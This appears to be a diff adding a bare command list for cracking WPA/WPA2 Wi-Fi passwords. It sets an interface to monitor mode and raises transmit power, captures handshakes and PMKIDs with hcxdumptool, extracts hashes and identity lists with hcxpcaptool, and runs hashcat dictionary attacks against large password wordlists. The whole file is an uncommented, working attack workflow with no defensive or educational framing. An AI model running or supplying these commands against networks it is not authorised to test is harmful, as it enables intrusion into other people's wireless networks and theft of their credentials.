@@ -1,0 +1,25 @@
+ifconfig wlan0 down
+
+airmon-ng check kill
+
+iwconfig wlan0 mode monitor
+
+ifconfig wlan0 up
+
+-----------------------------------
+
+iw wlan0 set channel 1 HT40+
+
+iwconfig wlan0 txpower 30
+
+iw wlan0 set txpower fixed 3000
+
+
+
+hcxdumptool -i wlan0 -o eap_eapol.pcapng -O unencrypred_ip4_ip6.pcapng -W encrypted_wep.pcapng -c 1,6,11 -t 15 --enable_status=1 --enable_status=2 --enable_status=4 --enable_status=8 --enable_status=16
+
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -P plainmasterkeylist -z pmkids.16800 -o wpa2handshakes.hccapx.2500.2501 -O raw_wpa2handshakes.hccapx.2500.2501 eap_eapol_kopie.pcapng 
+
+hashcat -m 16800 galleriaHC.16800 -a 0 -w 4 'topwifipass.txt'
+
+hashcat -m 2500 raw_wpa2handshakes.hccapx.2500.2501 -a 0 -w 4 -o out.pot /root/Dokumente/WPA-Passwords/Top1pt8Billion-WPA-probable-v2.txt
